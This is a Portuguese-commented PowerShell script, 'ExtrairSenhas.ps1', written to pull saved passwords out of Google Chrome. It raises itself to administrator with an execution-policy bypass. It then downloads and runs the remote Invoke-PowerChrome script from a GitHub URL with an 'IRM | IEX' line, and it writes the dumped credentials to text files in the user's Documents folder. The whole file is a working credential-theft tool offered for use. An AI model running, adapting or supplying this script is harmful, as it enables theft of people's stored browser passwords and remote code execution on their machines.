# ExtrairSenhas.ps1 - Versão robusta com suporte a qualquer idioma do Windows

# Força a execução como administrador (necessário para Chrome v20)
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Detecta a pasta Documents em QUALQUER idioma do Windows
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")

# Fallback: se por algum motivo a detecção falhar, usa um caminho genérico
if (-not $pastaDocuments -or -not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
    # Se ainda não existir, tenta "Meus Documentos" (PT-BR) ou "My Documents" (EN)
    if (-not (Test-Path $pastaDocuments)) {
        $pastaDocuments = Join-Path $env:USERPROFILE "Meus Documentos"
    }
    if (-not (Test-Path $pastaDocuments)) {
        $pastaDocuments = Join-Path $env:USERPROFILE "My Documents"
    }
    # Último recurso: cria a pasta Documents no perfil do usuário
    if (-not (Test-Path $pastaDocuments)) {
        $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
        New-Item -ItemType Directory -Path $pastaDocuments -Force | Out-Null
    }
}

Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

Write-Host "Executando extração de senhas do Chrome..." -ForegroundColor Cyan
Write-Host "Salvando em: $pastaDocuments" -ForegroundColor Yellow

# Muda temporariamente para a pasta Documents
Push-Location $pastaDocuments

# Executa o script original (ele vai salvar os arquivos na pasta atual)
Invoke-PowerChrome -Browser Chrome

# Volta para a pasta original
Pop-Location

# Verifica se os arquivos foram criados e lista eles
Write-Host "`n===================================================" -ForegroundColor Green
Write-Host "Arquivos gerados em: $pastaDocuments" -ForegroundColor Green
Get-ChildItem -Path $pastaDocuments -Filter "senhas_chrome*.txt" | ForEach-Object {
    Write-Host "  - $($_.Name) ($([math]::Round($_.Length/1KB, 2)) KB)" -ForegroundColor Cyan
}
Write-Host "===================================================" -ForegroundColor Green

Write-Host "`nPressione qualquer tecla para fechar..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
